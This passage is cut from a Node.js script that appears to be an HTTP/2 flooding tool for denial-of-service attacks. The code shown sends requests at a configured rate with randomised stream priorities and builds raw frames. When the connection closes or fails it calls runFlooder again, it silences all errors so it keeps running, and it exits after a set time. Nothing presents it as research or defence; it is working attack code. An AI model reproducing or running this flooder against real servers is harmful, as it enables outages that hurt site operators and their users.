            hpack.encode(dynHeaders),
          ]);

          const streamId = 1;
          const requests = [];
          let count = 0;

          const increaseRequestRate = async (client, dynHeaders, args) => {
            if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
              for (let i = 0; i < args.Rate; i++) {
                const requestPromise = new Promise((resolve, reject) => {
                  const req = client
                    .request(dynHeaders, {
                      weight: Math.random() < 0.5 ? 251 : 231,
                      depends_on: 0,
                      exclusive: Math.random() < 0.5 ? true : false,
                    })
                    .on("response", (response) => {
                      req.close(http2.constants.NO_ERROR);
                      req.destroy();
                      resolve();
                    });
                  req.on("end", () => {
                    count++;
                    if (count === args.time * args.Rate) {
                      clearInterval(intervalId);
                      client.close(http2.constants.NGHTTP2_CANCEL);
                    }
                    reject(new Error("Request timed out"));
                  });

                  req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                });

                const frame = encodeFrame(
                  streamId,
                  1,
                  packed,
                  0x1 | 0x4 | 0x20,
                );
                requests.push({ requestPromise, frame });
              }

              await Promise.all(
                requests.map(({ requestPromise }) => requestPromise),
              );
            }
          };

          await increaseRequestRate(client, dynHeaders, args);
        }
        sendRequests();
      }, 500);
    });

    client.on("close", () => {
      client.destroy();
      tlsSocket.destroy();
      connection.destroy();
      return runFlooder();
    });

    client.on("error", (error) => {
      client.destroy();
      connection.destroy();
      return runFlooder();
    });
  });
}
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on("uncaughtException", (error) => {});
process.on("unhandledRejection", (error) => {});
